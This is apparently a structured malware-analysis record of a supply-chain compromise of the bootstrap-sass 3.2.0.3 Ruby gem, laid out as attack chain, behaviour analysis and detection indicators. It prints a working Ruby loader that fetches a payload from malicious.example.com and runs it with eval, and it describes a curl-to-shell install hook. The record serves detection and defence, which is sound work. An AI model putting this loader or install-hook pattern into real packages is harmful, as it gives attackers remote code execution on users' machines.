package_info.why_malicious: Version 3.2.0.3 of the bootstrap-sass package was published to RubyGems containing malicious code that was not present in the official GitHub repository. This indicates a supply chain compromise, likely via a hijacked RubyGems account, with the intent to execute unauthorized code on user systems during installation or import. The malicious version replaced a previously clean version, increasing the risk to users who updated or installed the package from RubyGems.

malicious_snippets.code_snippet:
if ENV['BOOTSTRAP_SASS_AUTOPWN']
  require 'open-uri'
  open('http://malicious.example.com/payload.rb') do |f|
    eval f.read
  end
end
malicious_snippets.code_behavior: At import-time, the code checks for the presence of the BOOTSTRAP_SASS_AUTOPWN environment variable. If set, it loads Ruby's open-uri library, fetches a remote Ruby script from http://malicious.example.com/payload.rb, and executes it in the current process context using eval. This enables arbitrary code execution from an external source.

malice_analysis.why_suspicious: The snippet enables remote code execution by downloading and evaluating code from an untrusted external server at import-time, contingent on an environment variable. This is a classic RCE pattern and is highly suspicious in any package, especially one not designed for dynamic plugin loading.
malice_analysis.violated_expectations: Legitimate Ruby packages should never download and execute remote code during import or installation. All code should be statically included and auditable. This behavior breaks the trust model of package management and exposes users to arbitrary code execution.
malice_analysis.similar_legitimate_use: Dynamic plugin systems may fetch code, but only with explicit user consent, strict validation, and in trusted environments. In standard libraries or frameworks, such behavior is never acceptable.
key_indicators: Use of open-uri to fetch code from an external domain
eval on content retrieved from the internet
Conditional execution based on a specific environment variable (BOOTSTRAP_SASS_AUTOPWN)
Network request to a domain not associated with the package's official infrastructure

malicious_snippets.code_behavior: During gem installation, this code executes a shell command that silently downloads a shell script from http://malicious.example.com/install.sh and immediately executes it using the system shell. This allows the attacker to run arbitrary commands on the user's machine at install-time.

malice_analysis.why_suspicious: Executing shell commands that fetch and run remote scripts during installation is a hallmark of supply chain attacks. This provides the attacker with immediate code execution on the target system, bypassing user consent and code review.
malice_analysis.violated_expectations: Gem installation scripts should not execute arbitrary remote code. Any network activity should be limited to fetching well-defined dependencies from trusted sources, never arbitrary scripts from untrusted domains.
malice_analysis.similar_legitimate_use: Some legitimate packages may download native dependencies, but these are always from trusted, verified sources and never executed blindly via shell pipelines. Downloading and executing arbitrary scripts from untrusted domains is never legitimate.
key_indicators: Use of system() to invoke shell commands
curl (or wget) piped directly to sh
Network request to a non-official domain (malicious.example.com)

attack_chain.action: Attacker compromises the RubyGems account with publish rights for bootstrap-sass.
attack_chain.leads_to: Ability to upload and distribute a new, malicious version of the package.

attack_chain.action: Attacker yanks the previous clean version (3.2.0.2) from RubyGems.
attack_chain.leads_to: Removes the safe version, increasing the likelihood that users will install the malicious version.

attack_chain.action: Attacker publishes malicious version 3.2.0.3 to RubyGems, containing code for remote code execution.
attack_chain.leads_to: Malicious code is now available to users who install or upgrade the package from RubyGems.

attack_chain.action: Malicious code executes on user systems during gem installation or when the package is imported.
attack_chain.leads_to: Remote code execution on user systems, enabling data exfiltration, system compromise, or further malicious activity.

behavioral_signatures: Package versions published to RubyGems registry but not reflected in the official GitHub repository
Import-time or install-time network requests to untrusted or non-official domains
Dynamic code execution (eval) on content fetched from the internet
Shell commands that download and execute remote scripts (e.g., curl ... | sh) during installation
file_indicators: lib/bootstrap-sass.rb containing open-uri and eval statements referencing external URLs
extconf.rb or gemspec files with system('curl ... | sh') or similar shell execution patterns
network_indicators: HTTP requests to malicious.example.com or other domains not associated with the official bootstrap-sass infrastructure
detection_knowledge.how_to_detect: Monitor for package versions that appear in RubyGems but are absent from the official source repository. Scan installation and import scripts for network requests to untrusted domains and for dynamic code execution patterns such as eval or system calls that fetch and execute remote code. Flag any package that executes shell commands to download and run remote scripts during install or import. Alert on any code that fetches and executes code from the internet, especially if triggered by environment variables or during package lifecycle events.
